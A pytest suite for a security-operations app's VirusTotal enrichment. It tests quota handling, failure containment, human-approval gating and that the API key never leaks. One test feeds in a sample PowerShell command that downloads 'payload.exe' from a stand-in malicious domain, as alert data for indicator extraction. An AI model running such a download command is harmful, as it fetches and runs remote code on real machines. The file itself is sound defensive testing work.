"""Live (VirusTotal) enrichment through the real app: provider selection, API contract, quota-aware partial enrichment,
pipeline retries, investigation / response output, failure containment and secrecy.

VirusTotal is replaced by httpx.MockTransport (see the `live` fixture), so nothing here touches the network.
"""
import json
import logging
import pathlib
import socket
import time
from types import SimpleNamespace

import httpx
import pytest
from pydantic import SecretStr

from app.core.config import settings
from app.services import threat_intel
from app.services.orchestrator import _needs_enrichment
from app.tools.virustotal import VirusTotalClient
from vt_helpers import KEY, Clock, Server, flags_bad_ip, payload

SHA = "ab" * 32


@pytest.fixture(autouse=True)
def never_sleeps(monkeypatch):
    def boom(*a, **k):
        raise AssertionError("time.sleep was called")
    monkeypatch.setattr(time, "sleep", boom)


@pytest.fixture
def live(monkeypatch):
    """configure(respond, **settings_overrides) -> (server, clock): turns live mode on against a fake VirusTotal."""
    def configure(respond=None, clock=None, **overrides):
        server, clock = Server(respond or flags_bad_ip), clock or Clock()
        monkeypatch.setattr(settings, "THREAT_INTEL_PROVIDER", "virustotal")
        monkeypatch.setattr(settings, "VIRUSTOTAL_API_KEY", SecretStr(KEY))
        for name, value in overrides.items():
            monkeypatch.setattr(settings, name, value)
        real = VirusTotalClient
        monkeypatch.setattr(threat_intel, "VirusTotalClient",
                            lambda *a, **k: real(*a, transport=httpx.MockTransport(server), clock=clock, **k))
        threat_intel.reset_client()
        return server, clock
    return configure


def ingest(client, alert_id="L-1", **fields):
    payload_ = {"id": alert_id, "alert_title": "live test", **fields}
    assert client.post("/api/v1/alerts", json=payload_).status_code == 201
    return alert_id


def enrich(client, alert_id):
    res = client.post(f"/api/v1/alerts/{alert_id}/enrich")
    assert res.status_code == 200, res.text
    return res.json()["enrichment_result"], res.json()["alert"]


# ------------------------------------------------------------------ provider selection
@pytest.mark.parametrize("provider,key,mock_mode,active,has_reason", [
    ("mock", None, True, "mock", False),
    ("mock", KEY, True, "mock", False),                    # a key alone never turns live lookups on
    ("virustotal", KEY, True, "virustotal", False),
    ("VirusTotal ", KEY, True, "virustotal", False),
    ("virustotal", None, True, "mock", True),              # requested but no key: labelled fallback
    ("virustotal", "   ", True, "mock", True),
    ("virustotal", "", True, "mock", True),
    ("shodan", KEY, True, "mock", True),                   # unknown provider: safe fallback
    ("virustotal", KEY, False, "unavailable", True),       # THREAT_INTEL_MOCK_MODE=false still means "no lookups"
    ("mock", None, False, "unavailable", True),
])
def test_provider_resolution(monkeypatch, provider, key, mock_mode, active, has_reason):
    monkeypatch.setattr(settings, "THREAT_INTEL_PROVIDER", provider)
    monkeypatch.setattr(settings, "VIRUSTOTAL_API_KEY", SecretStr(key) if key is not None else None)
    monkeypatch.setattr(settings, "THREAT_INTEL_MOCK_MODE", mock_mode)
    choice = threat_intel.resolve_provider()
    assert choice.active == active and bool(choice.reason) == has_reason


def test_default_configuration_is_offline_mock():
    assert settings.THREAT_INTEL_PROVIDER == "mock" and settings.VIRUSTOTAL_API_KEY is None or settings.VIRUSTOTAL_API_KEY.get_secret_value() == ""
    assert threat_intel.resolve_provider().active == "mock" and not threat_intel.api_key_configured()


def test_mock_results_are_unchanged_when_live_mode_is_off(iso_client):
    ingest(iso_client, destination_ip="185.220.101.5", source_ip="192.168.1.5")
    enr, alert = enrich(iso_client, "L-1")
    assert enr["intel_mode"] == "mock" and enr["verified"] is False and enr["summary"]["malicious"] == 1
    assert not ({"fallback_reason", "requested_provider", "lookup_summary", "incomplete", "provider", "lookup_performed"} & set(enr))
    assert {i["provider"] for i in enr["iocs"]} == {"MockThreatIntel"} and alert["status"] == "ENRICHED"


def test_requesting_virustotal_without_a_key_falls_back_to_labelled_mock(iso_client, monkeypatch):
    monkeypatch.setattr(settings, "THREAT_INTEL_PROVIDER", "virustotal")
    ingest(iso_client, destination_ip="185.220.101.5")
    enr, _ = enrich(iso_client, "L-1")
    assert enr["intel_mode"] == "mock" and enr["requested_provider"] == "virustotal" and "VIRUSTOTAL_API_KEY" in enr["fallback_reason"]
    assert enr["summary"]["malicious"] == 1                               # same mock verdicts as before
    cfg = iso_client.get("/api/v1/config").json()["threat_intel"]
    assert cfg["requested_provider"] == "virustotal" and cfg["active_provider"] == "mock" and cfg["live_provider_active"] is False
    assert cfg["virustotal"]["api_key_configured"] is False and "VIRUSTOTAL_API_KEY" in cfg["fallback_reason"]
    audit = iso_client.get("/api/v1/audit-logs", params={"action": "ALERT_ENRICHED"}).json()[0]["details"]
    assert audit["intel_mode"] == "mock" and "fallback_reason" in audit


# ------------------------------------------------------------------ the live path through the API
def test_live_enrichment_keeps_the_contract_and_sends_only_public_indicators(iso_client, live):
    server, _ = live()
    ingest(iso_client, source_ip="10.0.0.5", destination_ip="185.220.101.5", file_hash=SHA,
           description="Beacon to 192.168.1.9 and 198.51.100.77 and 203.0.113.88")
    enr, alert = enrich(iso_client, "L-1")

    assert sorted(server.paths) == sorted(["/api/v3/ip_addresses/185.220.101.5", f"/api/v3/files/{SHA}"])     # nothing private/reserved
    assert enr["intel_mode"] == "live" and enr["provider"] == "VirusTotal" and enr["verified"] is False
    assert enr["agent"] == "Enrichment Agent" and enr["status"] == "completed" and enr["alert_id"] == "L-1"
    assert enr["total_iocs_extracted"] == len(enr["iocs"]) == 6
    assert set(enr["summary"]) == {"malicious", "suspicious", "clean", "unknown"}
    assert enr["summary"] == {"malicious": 1, "suspicious": 0, "clean": 1, "unknown": 4}
    for ioc in enr["iocs"]:      # the original per-IOC contract is intact
        assert {"value", "type", "source", "reputation", "confidence", "evidence", "provider"} <= set(ioc)
        assert ioc["type"] in {"IP", "SHA256", "DOMAIN", "URL"} and ioc["reputation"] in {"MALICIOUS", "SUSPICIOUS", "CLEAN", "UNKNOWN"}
    by_value = {i["value"]: i for i in enr["iocs"]}
    bad = by_value["185.220.101.5"]
    assert bad["reputation"] == "MALICIOUS" and bad["provider"] == "VirusTotal" and bad["lookup_status"] == "completed"
    assert bad["detections"]["malicious"] == 12 and bad["detected_by"] == ["EngineA", "EngineB"]
    assert bad["reference_url"] == "https://www.virustotal.com/gui/ip-address/185.220.101.5" and bad["retrieved_at"].endswith("Z")
    assert by_value[SHA]["reputation"] == "CLEAN"
    for private in ("10.0.0.5", "192.168.1.9", "198.51.100.77", "203.0.113.88"):
        assert by_value[private]["reputation"] == "UNKNOWN" and by_value[private]["lookup_status"] == "skipped_non_public_ip"
    assert enr["incomplete"] is False and enr["lookup_performed"] is True
    assert enr["lookup_summary"]["requests_made"] == 2 and enr["lookup_summary"]["skipped_ineligible"] == 4
    assert "VirusTotal" in enr["disclaimer"] and "not independently verified" in enr["disclaimer"]
    assert alert["status"] == "ENRICHED"
    stored = iso_client.get("/api/v1/alerts/L-1").json()["normalized_data"]["enrichment"]
    assert stored == enr


def test_urls_and_junk_domains_are_not_looked_up(iso_client, live):
    server, _ = live()
    ingest(iso_client, command_line=r"powershell -c iwr http://evil-domain.com/payload.exe?token=abc C:\Users\j.doe\a.ps1 install.sh")
    enr, _ = enrich(iso_client, "L-1")
    statuses = {i["value"]: i["lookup_status"] for i in enr["iocs"]}
    assert statuses["http://evil-domain.com/payload.exe?token=abc"] == "skipped_url"
    assert statuses["j.doe"].startswith("skipped") and statuses["install.sh"].startswith("skipped")
    assert statuses["evil-domain.com"] == "completed"
    assert server.paths == ["/api/v3/domains/evil-domain.com"]


# ------------------------------------------------------------------ limits: per-alert cap, quota, cache
def many_ips(n):
    return {"description": "contacted " + " ".join(f"8.8.1.{i + 1}" for i in range(n))}


def test_per_alert_lookup_cap(iso_client, live):
    server, _ = live(VIRUSTOTAL_MAX_LOOKUPS_PER_ALERT=5, VIRUSTOTAL_REQUESTS_PER_MINUTE=100)
    ingest(iso_client, **many_ips(7))
    enr, _ = enrich(iso_client, "L-1")
    statuses = [i["lookup_status"] for i in enr["iocs"]]
    assert statuses.count("completed") == 5 and statuses.count("budget_exceeded") == 2 and len(server.requests) == 5
    assert enr["incomplete"] is True and enr["lookup_summary"]["per_alert_limit_reached"] == 2
    assert all(i["reputation"] == "UNKNOWN" for i in enr["iocs"] if i["lookup_status"] == "budget_exceeded")


def test_quota_exhaustion_gives_partial_enrichment_and_a_later_call_finishes_it(iso_client, live):
    server, clock = live(VIRUSTOTAL_MAX_LOOKUPS_PER_ALERT=10, VIRUSTOTAL_REQUESTS_PER_MINUTE=4)
    ingest(iso_client, **many_ips(6))
    first, _ = enrich(iso_client, "L-1")
    assert [i["lookup_status"] for i in first["iocs"]] == ["completed"] * 4 + ["rate_limited"] * 2
    assert first["incomplete"] is True and len(server.requests) == 4 and first["lookup_summary"]["rate_limited"] == 2
    again, _ = enrich(iso_client, "L-1")                         # still inside the minute: cached ones are free, the rest wait
    assert again["lookup_summary"]["from_cache"] == 4 and again["lookup_summary"]["requests_made"] == 0 and len(server.requests) == 4
    clock.advance(61)
    done, _ = enrich(iso_client, "L-1")
    assert done["incomplete"] is False and {i["lookup_status"] for i in done["iocs"]} == {"completed"} and len(server.requests) == 6


def test_the_same_indicator_in_two_alerts_costs_one_request(iso_client, live):
    server, _ = live()
    ingest(iso_client, "L-1", destination_ip="185.220.101.5")
    ingest(iso_client, "L-2", destination_ip="185.220.101.5")
    enrich(iso_client, "L-1")
    second, _ = enrich(iso_client, "L-2")
    assert len(server.requests) == 1 and second["iocs"][0]["cached"] is True and second["iocs"][0]["reputation"] == "MALICIOUS"


# ------------------------------------------------------------------ failures stay contained
def test_timeouts_give_an_incomplete_but_successful_response(iso_client, live):
    def slow(request):
        raise httpx.ReadTimeout("slow")
    server, _ = live(slow, VIRUSTOTAL_REQUESTS_PER_MINUTE=100)
    ingest(iso_client, **many_ips(5))
    enr, alert = enrich(iso_client, "L-1")
    assert [i["lookup_status"] for i in enr["iocs"]] == ["timeout"] * 3 + ["circuit_open"] * 2     # the breaker stops the hammering
    assert enr["incomplete"] is True and enr["summary"]["unknown"] == 5 and len(server.requests) == 3 and alert["status"] == "ENRICHED"
    assert iso_client.get("/api/v1/audit-logs", params={"action": "AGENT_FAILED"}).json() == []


def test_a_rejected_key_is_reported_and_not_retried_forever(iso_client, live):
    server, _ = live(lambda r: httpx.Response(401, json={"error": {"code": "WrongCredentialsError"}}), VIRUSTOTAL_REQUESTS_PER_MINUTE=100)
    ingest(iso_client, **many_ips(2))
    enr, _ = enrich(iso_client, "L-1")
    assert {i["lookup_status"] for i in enr["iocs"]} == {"auth_error"} and "VIRUSTOTAL_API_KEY" in enr["iocs"][0]["evidence"]
    assert enr["incomplete"] is False and enr["lookup_summary"]["auth_error"] == 2          # nothing to retry until the key is fixed
    enrich(iso_client, "L-1")
    assert len(server.requests) == 1


def test_an_unexpected_exception_in_the_client_never_breaks_enrichment(iso_client, live, monkeypatch):
    live()
    monkeypatch.setattr(VirusTotalClient, "lookup", lambda self, *a, **k: (_ for _ in ()).throw(RuntimeError(f"boom {KEY}")))
    ingest(iso_client, destination_ip="185.220.101.5")
    enr, _ = enrich(iso_client, "L-1")
    assert enr["iocs"][0]["lookup_status"] == "error" and enr["incomplete"] is True and KEY not in json.dumps(enr)


# ------------------------------------------------------------------ the pipeline
def test_pipeline_reports_partial_enrichment_then_completes_it_on_later_runs(iso_client, live):
    server, clock = live()                                        # default quota: 4 requests per minute
    iso_client.post("/api/v1/alerts/seed")
    first = iso_client.post("/api/v1/pipeline/run").json()
    stages = {s["agent"]: s for s in first["stages"]}
    assert len(server.requests) == 4
    assert first["outcome"] == "partial" and first["status"] == "completed_with_errors" and stages["Enrichment Agent"]["status"] == "partial"
    assert first["alerts_with_incomplete_enrichment"] > 0 and any("incomplete threat-intelligence" in w for w in first["warnings"])
    assert stages["Enrichment Agent"]["errors"] == [] and stages["Enrichment Agent"]["notes"]      # a quota is not an error
    assert len(first["incidents_created"]) == 2 and stages["Response Agent"]["processed"] == 2     # later stages still ran

    clock.advance(61)
    second = iso_client.post("/api/v1/pipeline/run").json()
    assert second["alerts_with_incomplete_enrichment"] == 0 and second["outcome"] == "success" and second["warnings"] == []
    assert len(server.requests) == 7                              # 2 public IPs + 5 hashes, each asked about exactly once

    third = iso_client.post("/api/v1/pipeline/run").json()
    assert third["outcome"] == "success" and all(s["processed"] == 0 for s in third["stages"]) and len(server.requests) == 7


def test_live_findings_are_attributed_to_virustotal_and_never_called_mock(iso_client, live):
    live(VIRUSTOTAL_REQUESTS_PER_MINUTE=100)
    iso_client.post("/api/v1/alerts/seed")
    assert iso_client.post("/api/v1/pipeline/run").json()["outcome"] == "success"
    inc = next(i for i in iso_client.get("/api/v1/incidents").json() if "ALT-2026-001" in i["correlated_alert_ids"])
    inv = iso_client.get(f"/api/v1/incidents/{inc['id']}").json()["details"]["investigation"]
    kinds = {f["type"] for f in inv["findings"]}
    assert "external_intel" in kinds and "mock_intel" not in kinds and inv["counts"]["mock_intel"] == 0 and inv["counts"]["external_intel"] >= 1
    intel = [f for f in inv["findings"] if f["type"] == "external_intel"]
    assert all("VirusTotal" in f["statement"] and "Not independently verified" in f["statement"] for f in intel)
    assert any("185.220.101.5" in f["statement"] and f["reference_url"].startswith("https://www.virustotal.com/gui/") for f in intel)
    limits = " ".join(inv["limitations"])
    assert "VirusTotal" in limits and "not proof of safety" in limits and "local mock" not in limits
    assert "VirusTotal (not independently verified) flagged" in inv["summary"]

    recs = iso_client.get(f"/api/v1/incidents/{inc['id']}").json()["details"]["recommendations"]
    block = next(r for r in recs if r["action"].startswith("Block outbound traffic to 185.220.101.5"))
    assert "VirusTotal" in block["justification"] and any("VirusTotal" in p for p in block["preconditions"])
    # the block rests on the alert that states the traffic went to the address, not on the flagged verdict alone
    assert block["supporting_evidence"] == ["alert:ALT-2026-004"]
    assert "as the target of the host's traffic" in block["justification"]
    assert "MOCK" not in json.dumps(recs) and "mock" not in block["risk_if_wrong"].lower()
    assert all(r["requires_approval"] is True and r["executed"] is False and r["status"] == "PENDING" for r in recs)


def test_nothing_in_live_mode_executes_or_enforces_anything(iso_client, live):
    live(VIRUSTOTAL_REQUESTS_PER_MINUTE=100)
    iso_client.post("/api/v1/alerts/seed")
    iso_client.post("/api/v1/pipeline/run")
    for inc in iso_client.get("/api/v1/incidents").json():
        assert inc["human_approval_status"] == "PENDING" and inc["status"] == "RESPONSE_PROPOSED"
        assert all(r["executed"] is False and r["simulation_status"] == "NOT_RUN" for r in inc["details"]["recommendations"])
    assert iso_client.get("/api/v1/config").json()["execution_mode"] == "simulation_only"


def test_needs_enrichment_rule():
    alert = lambda data: SimpleNamespace(normalized_data=data)
    assert _needs_enrichment(alert(None)) and _needs_enrichment(alert({})) and _needs_enrichment(alert({"triage": {}}))
    assert _needs_enrichment(alert({"enrichment": {"incomplete": True}}))
    assert not _needs_enrichment(alert({"enrichment": {"incomplete": False}}))
    assert not _needs_enrichment(alert({"enrichment": {"summary": {}}}))        # mock results have no flag: done once
    assert not _needs_enrichment(alert({"enrichment": "unexpected"}))


# ------------------------------------------------------------------ configuration endpoint
def test_config_reports_live_mode_and_quota_without_the_key(iso_client, live):
    live(VIRUSTOTAL_MALICIOUS_THRESHOLD=5)
    ingest(iso_client, destination_ip="185.220.101.5")
    enrich(iso_client, "L-1")
    res = iso_client.get("/api/v1/config")
    ti = res.json()["threat_intel"]
    assert ti["mode"] == "live" and ti["active_provider"] == "virustotal" and ti["live_provider_active"] is True and ti["fallback_reason"] is None
    vt = ti["virustotal"]
    assert vt["api_key_configured"] is True and vt["malicious_threshold"] == 5 and vt["url_lookups"] == "disabled"
    assert vt["quota"]["used_last_minute"] == 1 and vt["quota"]["per_minute"] == 4 and vt["quota"]["per_day"] == 500
    assert KEY not in res.text


# ------------------------------------------------------------------ secrecy, end to end
def test_the_api_key_never_leaks_anywhere(iso_client, live, caplog):
    caplog.set_level(logging.DEBUG)

    def respond(request):
        host = request.url.path.rsplit("/", 1)[-1]
        echoed = {"error": {"code": "X", "message": f"request with key {request.headers['x-apikey']} failed"}}
        if host == "8.8.4.4":
            return httpx.Response(429, headers={"Retry-After": "30"}, json=echoed)
        if host == "1.1.1.1":
            raise httpx.ReadTimeout(f"timed out for {request.headers['x-apikey']}")
        return httpx.Response(200, json=payload(malicious=9, engines=["EngineA"]))
    live(respond, VIRUSTOTAL_REQUESTS_PER_MINUTE=100)
    ingest(iso_client, "L-1", description="8.8.8.8 8.8.4.4 1.1.1.1", destination_ip="185.220.101.5")
    ingest(iso_client, "L-2", host="H1", destination_ip="185.220.101.5", timestamp="2026-09-03T08:00:00Z")
    ingest(iso_client, "L-3", host="H1", destination_ip="185.220.101.5", timestamp="2026-09-03T08:10:00Z")
    enrich(iso_client, "L-1")
    iso_client.post("/api/v1/pipeline/run")
    inc_id = iso_client.get("/api/v1/incidents").json()[0]["id"]
    iso_client.post(f"/api/v1/incidents/{inc_id}/approve", json={"reviewer": "Tester"})

    texts = [iso_client.get(path).text for path in (
        "/api/v1/alerts?limit=100", "/api/v1/alerts/L-1", "/api/v1/incidents", f"/api/v1/incidents/{inc_id}", "/api/v1/config",
        "/api/v1/audit-logs?limit=200", "/api/v1/pipeline/runs", "/api/v1/agents", "/api/v1/stats", "/api/v1/health", "/api/v1/version")]
    texts += [repr(settings), str(settings.model_dump()), settings.model_dump_json(), repr(settings.VIRUSTOTAL_API_KEY), caplog.text]
    for text in texts:
        assert KEY not in text
    assert "x-apikey" not in " ".join(texts).lower()


def test_api_error_responses_do_not_echo_provider_text(iso_client, live):
    live(lambda r: httpx.Response(500, text=f"upstream exploded with {r.headers['x-apikey']}"), VIRUSTOTAL_REQUESTS_PER_MINUTE=100)
    ingest(iso_client, destination_ip="185.220.101.5")
    res = iso_client.post("/api/v1/alerts/L-1/enrich")
    assert res.status_code == 200 and KEY not in res.text and "exploded" not in res.text


# ------------------------------------------------------------------ guards
def test_tests_cannot_reach_the_internet():
    with pytest.raises(RuntimeError, match="blocked"):
        socket.create_connection(("www.virustotal.com", 443), timeout=1)
    with pytest.raises(RuntimeError, match="blocked"):
        httpx.get("https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8", timeout=1)


def test_the_integration_only_reads_and_contains_no_execution_code():
    root = pathlib.Path(__file__).resolve().parents[1] / "app"
    sources = {p: p.read_text(encoding="utf-8") for p in (root / "tools" / "virustotal.py", root / "services" / "threat_intel.py",
                                                         root / "agents" / "enrichment" / "live_enrichment_agent.py")}
    for path, text in sources.items():
        for forbidden in ("subprocess", "os.system", "eval(", "exec(", "shutil", "os.remove", "time.sleep", "socket."):
            assert forbidden not in text, f"{path.name} contains {forbidden}"
    vt = sources[root / "tools" / "virustotal.py"]
    assert ".get(" in vt and not any(f".{verb}(" in vt for verb in ("post", "put", "delete", "patch", "request", "stream", "send"))
